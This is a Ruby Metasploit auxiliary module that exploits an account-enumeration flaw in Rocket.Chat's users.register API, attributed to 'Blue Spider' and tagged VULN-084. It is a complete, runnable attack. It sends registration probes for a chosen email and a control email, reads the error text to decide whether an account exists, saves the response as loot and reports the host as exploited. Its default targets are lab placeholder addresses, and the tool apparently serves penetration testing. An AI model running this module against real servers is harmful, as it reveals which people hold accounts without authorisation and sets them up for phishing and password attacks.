class MetasploitModule < Msf::Auxiliary
  LOGIN_PATH = '/api/v1/login'.freeze

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Rocket.Chat users.register account-existence oracle (VULN-084)',
        'Description' => %q{
          Rocket.Chat's users.register leaks whether an email has an account, even
          when registration is disabled, by answering 'Email already exists' ahead of
          the registration-closed check. This module probes KNOWNEMAIL and reports
          whether an account exists for it, without creating one (an existing address
          is rejected before creation, an unknown one is rejected by the disabled
          form). The operator supplies the address to test.
        },
        'Author' => ['Blue Spider'],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2021-22892'],
          ['URL', 'https://github.com/RocketChat/Rocket.Chat/issues'],
          ['URL', 'https://kohirc.com']
        ],
        'DisclosureDate' => '2026-11-24',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options([
      Opt::RPORT(39649),
      OptString.new('TARGETURI', [true, 'Base path to Rocket.Chat', '/api/v1/users.register']),
      OptString.new('KNOWNEMAIL', [true, 'An email address believed to have an account', 'admin@lab.invalid']),
      OptString.new('ABSENTEMAIL', [true, 'An email with no account, for the control probe', 'bs-absent-84@lab.invalid'])
    ])
  end

  def run
    res = reg(datastore['KNOWNEMAIL'])
    fail_with(Failure::Unreachable, 'No response from the target.') unless res

    hit = api_error(res).include?('Email already exists') && api_error(reg(datastore['ABSENTEMAIL'])).downcase.include?('registration')
    fail_with(Failure::NotVulnerable, 'VULN-084: the attack did not land') unless hit

    print_good("#{peer} - VULN-084: exploited")
    print_good("#{peer} - an account exists for #{datastore['KNOWNEMAIL']} (register returned 'Email already exists')")
    print_status("  control #{datastore['ABSENTEMAIL']} -> #{api_error(reg(datastore['ABSENTEMAIL']))} (no account; enumeration works with registration disabled)")
    path = store_loot('blue_spider.vuln_084', 'text/plain', rhost, res.body.to_s, 'vuln_084.txt', 'VULN-084 response')
    print_good("#{peer} - Saved the response to #{path}")
    report_vuln(
      host: rhost,
      port: rport,
      proto: 'tcp',
      sname: (ssl ? 'https' : 'http'),
      name: name,
      info: 'VULN-084 exploited by Blue Spider',
      refs: references
    )
  end
  # The REST API answers 200 with {"success": false} for a refusal, so the
  # body, not the status line, is what a check has to read.
  def parse_json(res)
    return {} unless res

    doc = res.get_json_document
    doc.is_a?(Hash) ? doc : {}
  rescue StandardError
    {}
  end

  def api_error(res)
    doc = parse_json(res)
    doc['errorType'] || doc['error'] || doc['message'] || ''
  end

  def reg(email)
    send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path),
      'ctype' => 'application/json',
      # 'pass' is deliberately one character: the email check answers
      # before the password policy does, which is the whole finding, so
      # the oracle still speaks and no account can ever be created here.
      'data' => { 'username' => 'bsprobe', 'email' => email,
                  'pass' => 'a', 'name' => 'probe' }.to_json
    })
  end
end
